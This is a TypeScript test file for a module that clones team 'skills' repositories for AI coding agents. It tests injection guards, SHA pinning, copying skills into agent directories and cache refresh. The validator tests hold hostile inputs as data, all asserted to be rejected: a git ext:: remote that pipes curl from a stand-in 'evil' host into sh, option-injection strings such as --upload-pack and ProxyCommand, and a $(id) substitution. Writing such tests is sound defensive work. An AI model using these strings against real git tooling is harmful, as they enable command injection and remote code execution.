import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { homedir, tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import test from 'node:test';
import {
  bareDirFor,
  ensureBareClone,
  getTeamSkillsCached,
  isPinnedSha,
  isSafeRef,
  lastFetchStampPath,
  listRemoteSkills,
  materializeSkillDir,
  refreshTeamSkills,
  safeRemoteFor,
  waitForTeamSkills,
  __markCloneAttemptedForTests,
} from '../../src/skills-remote.js';

const SRC_DIR = dirname(fileURLToPath(import.meta.url));
const SKILLS_REMOTE = join(SRC_DIR, '../../src/skills-remote.ts');
const PASSIVE_FETCH_TTL_MS = 6 * 60 * 60 * 1_000;

// ---- safeRemoteFor: repo/URL injection guard (#428) --------------------------

test('safeRemoteFor rejects the git remote-helper RCE surface', () => {
  // `ext::`/`fd::` transports run arbitrary commands — the headline vector.
  assert.equal(safeRemoteFor("ext::sh -c 'curl evil.sh|sh'"), null);
  assert.equal(safeRemoteFor('fd::17'), null);
  // A leading `-` is argument injection against git's option surface.
  assert.equal(safeRemoteFor('--upload-pack=touch /tmp/pwn'), null);
  assert.equal(safeRemoteFor('-oProxyCommand=evil'), null);
  // Any scheme outside the transport allowlist.
  assert.equal(safeRemoteFor('ftp://evil/x.git'), null);
  assert.equal(safeRemoteFor('javascript://x'), null);
  assert.equal(safeRemoteFor(''), null);
  assert.equal(safeRemoteFor('   '), null);
  // A bare word is neither shorthand, URL, scp-like, nor a path.
  assert.equal(safeRemoteFor('not-a-real-remote'), null);
});

test('safeRemoteFor accepts the documented safe source shapes', () => {
  assert.equal(safeRemoteFor('open-mercato/skills'), 'https://github.com/open-mercato/skills.git');
  assert.equal(safeRemoteFor('https://github.com/o/n.git'), 'https://github.com/o/n.git');
  assert.equal(safeRemoteFor('http://internal.example/n.git'), 'http://internal.example/n.git');
  assert.equal(safeRemoteFor('ssh://git@host/o/n.git'), 'ssh://git@host/o/n.git');
  assert.equal(safeRemoteFor('git@github.com:o/n.git'), 'git@github.com:o/n.git');
  // Local paths / file:// stay working (a documented source shape).
  assert.equal(safeRemoteFor('/abs/path/to/repo'), '/abs/path/to/repo');
  assert.equal(safeRemoteFor('./rel/repo'), './rel/repo');
  assert.equal(safeRemoteFor('../sibling/repo'), '../sibling/repo');
  assert.equal(safeRemoteFor('file:///abs/repo'), 'file:///abs/repo');
  // `.` and `-` are in the owner/name charset, so a single-segment relative
  // path must be matched as a path first, not rewritten to a github.com URL.
  assert.equal(safeRemoteFor('./rel'), './rel');
  assert.equal(safeRemoteFor('../rel'), '../rel');
});

test('safeRemoteFor keeps Windows local paths working (BC §5: local path)', () => {
  // win32 is a supported platform and these worked before the hardening —
  // narrowing the `skillsRepos` source shape would be a breaking change.
  assert.equal(safeRemoteFor('C:\\skills'), 'C:\\skills');
  assert.equal(safeRemoteFor('C:/skills'), 'C:/skills');
  assert.equal(safeRemoteFor('d:\\team\\skills'), 'd:\\team\\skills');
  // Still not a licence for a drive-letter-shaped transport helper.
  assert.equal(safeRemoteFor('C:\\x::y'), null);
});

test('safeRemoteFor expands ~/ so git (no shell) can actually find it', () => {
  // execFile gives git no shell, so a literal `~` would be a directory name.
  assert.equal(safeRemoteFor('~/skills'), join(homedir(), 'skills'));
});

test('node test Git fixtures use isolated config and a fixed identity', (t) => {
  const dir = mkdtempSync(join(tmpdir(), 'cez-git-env-'));
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const git = (...args: string[]) => execFileSync('git', args, { cwd: dir, encoding: 'utf8' }).trim();
  git('init', '-q', '-b', 'main');
  git('remote', 'add', 'origin', 'git@github.com:acme/demo.git');
  assert.equal(git('remote', 'get-url', 'origin'), 'git@github.com:acme/demo.git');
  git('commit', '--allow-empty', '-qm', 'fixture');
  assert.equal(git('log', '-1', '--format=%an <%ae>'), 'Cezar Tests <tests@cezar.invalid>');
  assert.equal(process.env.GIT_CONFIG_NOSYSTEM, '1');
});

// ---- isSafeRef / isPinnedSha: ref injection guard (#428) ---------------------

test('isSafeRef rejects argument-injection and range refs', () => {
  assert.equal(isSafeRef('--output=/tmp/pwn'), false);
  assert.equal(isSafeRef('-x'), false);
  assert.equal(isSafeRef('main..evil'), false);
  assert.equal(isSafeRef('a b'), false);
  assert.equal(isSafeRef('a;b'), false);
  assert.equal(isSafeRef('$(id)'), false);
  assert.equal(isSafeRef(''), false);
});

test('isSafeRef accepts real branches, tags and SHAs', () => {
  assert.equal(isSafeRef('main'), true);
  assert.equal(isSafeRef('refs/heads/main'), true);
  assert.equal(isSafeRef('release/1.2.3'), true);
  assert.equal(isSafeRef('v1.2.3'), true);
  assert.equal(isSafeRef('a'.repeat(40)), true);
});

test('isPinnedSha recognises full sha-1 and sha-256 commit ids', () => {
  assert.equal(isPinnedSha('0'.repeat(40)), true);
  assert.equal(isPinnedSha('abcdef0123456789'.padEnd(64, '0')), true);
  assert.equal(isPinnedSha('main'), false);
  assert.equal(isPinnedSha('abc'), false); // short sha is not a pin
});

// ---- ensureBareClone refuses unsafe remotes before touching git (#428) -------

test('ensureBareClone throws on an unsafe remote instead of shelling out', async () => {
  await assert.rejects(
    ensureBareClone("ext::sh -c 'touch /tmp/pwn'"),
    /refusing unsafe skills repo remote/,
  );
});

// ---- integration: local clone still works, SHA pins, bad ref degrades --------

test('listRemoteSkills clones a local repo, pins the SHA, and refuses a bad ref', async (t) => {
  const home = mkdtempSync(join(tmpdir(), 'cez-home-'));
  const srcDir = mkdtempSync(join(tmpdir(), 'cez-src-'));
  const prevHome = process.env.HOME;
  process.env.HOME = home; // redirect the ~/.cache/cez skills cache into temp
  t.after(() => {
    if (prevHome === undefined) delete process.env.HOME;
    else process.env.HOME = prevHome;
    rmSync(home, { recursive: true, force: true });
    rmSync(srcDir, { recursive: true, force: true });
  });

  const g = (args: string[]) =>
    execFileSync('git', args, { cwd: srcDir, encoding: 'utf8' }).trim();
  g(['-c', 'init.defaultBranch=main', 'init']);
  g(['config', 'user.email', 'test@example.com']);
  g(['config', 'user.name', 'Test']);
  writeFileSync(
    join(srcDir, 'SKILL.md'),
    '---\nname: demo\ndescription: a demo skill\n---\nbody text\n',
  );
  // A directory skill needs SKILL.md under a directory to be named after it.
  execFileSync('mkdir', ['-p', join(srcDir, 'greeter')]);
  writeFileSync(join(srcDir, 'greeter', 'SKILL.md'), '---\ndescription: hi\n---\nsay hi\n');
  g(['add', '-A']);
  g(['commit', '-m', 'init']);
  const sha = g(['rev-parse', 'HEAD']);

  await ensureBareClone(srcDir);

  // Branch ref: skills come back and record the resolved commit.
  const onMain = await listRemoteSkills({ repo: srcDir, ref: 'main' });
  const greeter = onMain.find((s) => s.name === 'greeter');
  assert.ok(greeter, 'expected the directory skill to be listed');
  assert.equal(greeter?.team?.commit, sha);

  // Pinned SHA ref: identical result, and the pin is honoured.
  const onSha = await listRemoteSkills({ repo: srcDir, ref: sha });
  assert.ok(onSha.some((s) => s.name === 'greeter'));

  // A wrong pinned SHA resolves to nothing (no HEAD fallback).
  const wrong = await listRemoteSkills({ repo: srcDir, ref: 'f'.repeat(40) });
  assert.deepEqual(wrong, []);

  // An injection ref is refused outright.
  const evil = await listRemoteSkills({ repo: srcDir, ref: '--output=/tmp/pwn' });
  assert.deepEqual(evil, []);
});

// ---- materialization: every supported agent skill dir gets the directory skill ----

test('materializeSkillDir seeds Claude, Agents, and Cursor skill dirs and excludes them from git', async (t) => {
  const home = mkdtempSync(join(tmpdir(), 'cez-home-'));
  const srcDir = mkdtempSync(join(tmpdir(), 'cez-src-'));
  const repoRoot = mkdtempSync(join(tmpdir(), 'cez-root-'));
  const prevHome = process.env.HOME;
  process.env.HOME = home; // redirect the ~/.cache/cez skills cache into temp
  t.after(() => {
    if (prevHome === undefined) delete process.env.HOME;
    else process.env.HOME = prevHome;
    for (const d of [home, srcDir, repoRoot]) rmSync(d, { recursive: true, force: true });
  });

  const g = (args: string[], cwd: string) =>
    execFileSync('git', args, { cwd, encoding: 'utf8' }).toString().trim();

  // Source skills repo: one directory skill with a companion references file.
  g(['-c', 'init.defaultBranch=main', 'init'], srcDir);
  g(['config', 'user.email', 'test@example.com'], srcDir);
  g(['config', 'user.name', 'Test'], srcDir);
  mkdirSync(join(srcDir, 'greeter', 'references'), { recursive: true });
  const skillMd = '---\ndescription: hi\n---\nsay hi\n';
  const notesMd = 'companion notes\n';
  writeFileSync(join(srcDir, 'greeter', 'SKILL.md'), skillMd);
  writeFileSync(join(srcDir, 'greeter', 'references', 'notes.md'), notesMd);
  g(['add', '-A'], srcDir);
  g(['commit', '-m', 'init'], srcDir);

  await ensureBareClone(srcDir);
  const skills = await listRemoteSkills({ repo: srcDir, ref: 'main' });
  const greeter = skills.find((s) => s.name === 'greeter');
  assert.ok(greeter, 'expected the directory skill to be listed');

  // Target project root: a git repo so the shared info/exclude exists.
  g(['-c', 'init.defaultBranch=main', 'init'], repoRoot);

  const ok = await materializeSkillDir(repoRoot, greeter);
  assert.equal(ok, true, 'materializeSkillDir should have seeded the directory skill');

  // Every destination gets the full directory (SKILL.md + references/) —
  // Claude reads .claude/skills, codex/pi read .agents/skills, and Cursor reads
  // .cursor/skills. Dropping one loses that backend's companion files on disk.
  for (const agentDir of ['.claude', '.agents', '.cursor']) {
    const destSkill = join(repoRoot, agentDir, 'skills', 'greeter');
    assert.ok(
      existsSync(join(destSkill, 'SKILL.md')),
      `${agentDir}/skills/greeter/SKILL.md must be materialized`,
    );
    assert.equal(readFileSync(join(destSkill, 'SKILL.md'), 'utf8'), skillMd);
    assert.equal(
      readFileSync(join(destSkill, 'references', 'notes.md'), 'utf8'),
      notesMd,
    );
  }

  // Every path stays out of the user's git via the shared info/exclude.
  const exclude = readFileSync(join(repoRoot, '.git', 'info', 'exclude'), 'utf8');
  assert.ok(exclude.split('\n').includes('.claude/skills/greeter/'));
  assert.ok(
    exclude.split('\n').includes('.agents/skills/greeter/'),
    'exclude must contain .agents/skills/greeter/',
  );
  assert.ok(
    exclude.split('\n').includes('.cursor/skills/greeter/'),
    'exclude must contain .cursor/skills/greeter/',
  );
});

// ---- per-project team-skills cache isolation (multi-project workspace, 2.6) --

test('team-skills cache is keyed by repoRoot — projects never see each other\'s skills', async (t) => {
  const home = mkdtempSync(join(tmpdir(), 'cez-home-'));
  const prevHome = process.env.HOME;
  process.env.HOME = home; // redirect the ~/.cache/cez skills cache into temp
  const dirs: string[] = [home];
  t.after(() => {
    if (prevHome === undefined) delete process.env.HOME;
    else process.env.HOME = prevHome;
    for (const d of dirs) rmSync(d, { recursive: true, force: true });
  });

  /** One local skills repo carrying a single directory skill named `name`. */
  const makeSkillsRepo = (name: string): string => {
    const src = mkdtempSync(join(tmpdir(), `cez-src-${name}-`));
    dirs.push(src);
    const g = (args: string[]) => execFileSync('git', args, { cwd: src, encoding: 'utf8' });
    g(['-c', 'init.defaultBranch=main', 'init']);
    g(['config', 'user.email', 'test@example.com']);
    g(['config', 'user.name', 'Test']);
    mkdirSync(join(src, name));
    writeFileSync(join(src, name, 'SKILL.md'), `---\ndescription: ${name}\n---\n${name} body\n`);
    g(['add', '-A']);
    g(['commit', '-m', 'init']);
    return src;
  };

  /** One project root whose `.ai/cezar/config.json` points at its own skills repo. */
  const makeProjectRoot = (skillsRepo: string): string => {
    const root = mkdtempSync(join(tmpdir(), 'cez-root-'));
    dirs.push(root);
    mkdirSync(join(root, '.ai/cezar'), { recursive: true });
    writeFileSync(
      join(root, '.ai/cezar', 'config.json'),
      JSON.stringify({ skillsRepos: [{ repo: skillsRepo, ref: 'main' }] }),
    );
    return root;
  };

  const rootA = makeProjectRoot(makeSkillsRepo('alpha-skill'));
  const rootB = makeProjectRoot(makeSkillsRepo('beta-skill'));

  const loadedA = await refreshTeamSkills(rootA);
  const loadedB = await refreshTeamSkills(rootB);
  assert.deepEqual(loadedA.map((s) => s.name), ['alpha-skill']);
  assert.deepEqual(loadedB.map((s) => s.name), ['beta-skill']);

  // The regression: the cache was one module-global list, so after B's load,
  // A's scope was served B's skills. Each root must keep its own entry.
  assert.deepEqual(getTeamSkillsCached(rootA).map((s) => s.name), ['alpha-skill']);
  assert.deepEqual(getTeamSkillsCached(rootB).map((s) => s.name), ['beta-skill']);
});

// ---- cross-process last-fetch stamp (#367) ------------------------------------

function makeSkillsRepoWithHome(t: { after: (fn: () => void) => void }): {
  home: string;
  srcDir: string;
  makeProjectRoot: () => string;
  commit: (message: string) => string;
} {
  const home = mkdtempSync(join(tmpdir(), 'cez-home-'));
  const srcDir = mkdtempSync(join(tmpdir(), 'cez-src-'));
  const dirs = [home, srcDir];
  const prevHome = process.env.HOME;
  process.env.HOME = home;
  t.after(() => {
    if (prevHome === undefined) delete process.env.HOME;
    else process.env.HOME = prevHome;
    for (const d of dirs) rmSync(d, { recursive: true, force: true });
  });

  const g = (args: string[]) =>
    execFileSync('git', args, { cwd: srcDir, encoding: 'utf8' }).trim();
  g(['-c', 'init.defaultBranch=main', 'init']);
  g(['config', 'user.email', 'test@example.com']);
  g(['config', 'user.name', 'Test']);
  mkdirSync(join(srcDir, 'greeter'));
  writeFileSync(join(srcDir, 'greeter', 'SKILL.md'), '---\ndescription: hi\n---\nsay hi\n');
  g(['add', '-A']);
  g(['commit', '-m', 'init']);

  return {
    home,
    srcDir,
    makeProjectRoot() {
      const root = mkdtempSync(join(tmpdir(), 'cez-root-'));
      dirs.push(root);
      mkdirSync(join(root, '.ai/cezar'), { recursive: true });
      writeFileSync(
        join(root, '.ai/cezar', 'config.json'),
        JSON.stringify({ skillsRepos: [{ repo: srcDir, ref: 'main' }] }),
      );
      return root;
    },
    commit(message: string) {
      writeFileSync(join(srcDir, 'greeter', 'SKILL.md'), `---\ndescription: ${message}\n---\n${message}\n`);
      g(['add', '-A']);
      g(['commit', '-m', message]);
      return g(['rev-parse', 'HEAD']);
    },
  };
}

function childTeamSkillCommit(home: string, repoRoot: string): string {
  const script = `
    process.env.HOME = ${JSON.stringify(home)};
    const { waitForTeamSkills } = await import(${JSON.stringify(SKILLS_REMOTE)});
    const skills = await waitForTeamSkills(${JSON.stringify(repoRoot)});
    const greeter = skills.find((s) => s.name === 'greeter');
    process.stdout.write(greeter?.team?.commit ?? '');
  `;
  return execFileSync(process.execPath, ['--import', 'tsx', '--input-type=module', '-e', script], {
    encoding: 'utf8',
    timeout: 30_000,
  }).trim();
}

test('a new process with a fresh stamp does not git-fetch on first catalog read (#367)', async (t) => {
  const ctx = makeSkillsRepoWithHome(t);
  const sha1 = execFileSync('git', ['rev-parse', 'HEAD'], { cwd: ctx.srcDir, encoding: 'utf8' }).trim();
  await refreshTeamSkills(ctx.makeProjectRoot());
  const stampPath = lastFetchStampPath(bareDirFor(ctx.srcDir));
  assert.ok(existsSync(stampPath), 'refresh must persist a last-fetch stamp');

  const sha2 = ctx.commit('second');
  assert.notEqual(sha2, sha1);

  const seen = childTeamSkillCommit(ctx.home, ctx.makeProjectRoot());
  assert.equal(seen, sha1, 'fresh stamp must suppress fetch in a brand-new process');
});

test('a new process with a stale stamp fetches once and rewrites the stamp (#367)', async (t) => {
  const ctx = makeSkillsRepoWithHome(t);
  await refreshTeamSkills(ctx.makeProjectRoot());
  const sha2 = ctx.commit('second');
  const stampPath = lastFetchStampPath(bareDirFor(ctx.srcDir));
  const before = Number(readFileSync(stampPath, 'utf8').trim());
  writeFileSync(stampPath, `${before - PASSIVE_FETCH_TTL_MS - 1}\n`);

  const seen = childTeamSkillCommit(ctx.home, ctx.makeProjectRoot());
  assert.equal(seen, sha2);
  const after = Number(readFileSync(stampPath, 'utf8').trim());
  assert.ok(after > before, 'stale-stamp fetch must rewrite the stamp');
});

test('a concurrent sibling success does not block the later TTL fetch (#367)', async (t) => {
  const ctx = makeSkillsRepoWithHome(t);
  await Promise.all([waitForTeamSkills(ctx.makeProjectRoot()), waitForTeamSkills(ctx.makeProjectRoot())]);
  // Reproduce the review race: a loser recorded cloneAttempted after a
  // sibling already wrote a fresh stamp. The next catalog read must drop
  // that flag so a later TTL still fetches.
  __markCloneAttemptedForTests(ctx.srcDir);
  await waitForTeamSkills(ctx.makeProjectRoot());

  const sha2 = ctx.commit('second');
  const stampPath = lastFetchStampPath(bareDirFor(ctx.srcDir));
  const before = Number(readFileSync(stampPath, 'utf8').trim());
  writeFileSync(stampPath, `${before - PASSIVE_FETCH_TTL_MS - 1}\n`);

  const loaded = await waitForTeamSkills(ctx.makeProjectRoot());
  assert.equal(
    loaded.find((s) => s.name === 'greeter')?.team?.commit,
    sha2,
    'a failed concurrent first-load must not leave cloneAttempted blocking the TTL',
  );
});

test('refreshTeamSkills fetches even when the stamp is still fresh (#367)', async (t) => {
  const ctx = makeSkillsRepoWithHome(t);
  const sha1 = execFileSync('git', ['rev-parse', 'HEAD'], { cwd: ctx.srcDir, encoding: 'utf8' }).trim();
  const root = ctx.makeProjectRoot();
  await refreshTeamSkills(root);
  const sha2 = ctx.commit('second');
  assert.notEqual(sha2, sha1);

  const loaded = await refreshTeamSkills(root);
  const greeter = loaded.find((s) => s.name === 'greeter');
  assert.equal(greeter?.team?.commit, sha2);
});
